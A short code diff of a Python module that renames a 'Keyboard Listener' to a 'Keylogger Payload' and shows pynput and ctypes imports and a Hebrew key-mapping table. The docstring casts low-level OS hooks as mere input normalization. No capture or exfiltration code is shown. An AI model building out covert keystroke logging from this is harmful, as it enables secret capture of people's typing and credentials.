@@ -1,6 +1,9 @@
 """
-Module: Keyboard Listener
-Description: Captures keystrokes, handles Uppercase, maps Hebrew, and ignores noise keys (Alt, Shift, Ctrl).
+Module: Keylogger Payload (The Core Feature)
+Description: Captures and interprets raw hardware input signals.
+             Uses low-level OS hooks (ctypes) strictly for input normalization
+             (e.g., handling Caps Lock state, Shift modifiers, and Keyboard Layouts).
+             Designed to be a standalone, portable module.
 """
 
 import pynput.keyboard
@@ -8,9 +11,6 @@ from pynput.keyboard import Key
 import config
 import ctypes
 
-# -----------------------------------------------------------------------------
-# HEBREW MAPPING
-# -----------------------------------------------------------------------------
 HEBREW_MAP = {
     'q': '/', 'w': "'", 'e': 'ק', 'r': 'ר', 't': 'א', 'y': 'ט', 'u': 'ו', 'i': 'ן', 'o': 'ם', 'p': 'פ',
     'a': 'ש', 's': 'ד', 'd': 'ג', 'f': 'כ', 'g': 'ע', 'h': 'י', 'j': 'ח', 'k': 'ל', 'l': 'ך', ';': 'ף',
